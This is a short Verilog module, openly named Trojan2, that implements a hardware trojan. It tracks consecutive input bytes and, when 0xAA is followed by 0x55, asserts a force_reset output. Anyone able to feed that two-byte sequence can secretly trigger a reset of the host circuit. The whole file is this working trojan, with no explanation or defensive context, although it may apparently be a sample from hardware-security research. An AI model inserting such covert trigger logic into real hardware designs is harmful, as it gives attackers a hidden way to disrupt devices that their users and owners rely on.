module Trojan2 #(
    parameter DATA_WIDTH = 8,
    parameter TRIGGER_SEQUENCE_1 = 8'hAA,
    parameter TRIGGER_SEQUENCE_2 = 8'h55
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] data_in,
    output reg force_reset
);
    reg [DATA_WIDTH-1:0] prev_data;
    reg trigger_detected;
    
    wire trigger = (prev_data == TRIGGER_SEQUENCE_1[DATA_WIDTH-1:0] && data_in == TRIGGER_SEQUENCE_2[DATA_WIDTH-1:0]);
    
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            prev_data <= {DATA_WIDTH{1'b0}};
            trigger_detected <= 1'b0;
        end else begin
            prev_data <= data_in;
            
            if (trigger && !trigger_detected) begin
                trigger_detected <= 1'b1;
            end else if (trigger_detected) begin
                trigger_detected <= 1'b0;
            end
        end
    end
    
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            force_reset <= 1'b0;
        end else begin
            force_reset <= trigger_detected;
        end
    end
    
endmodule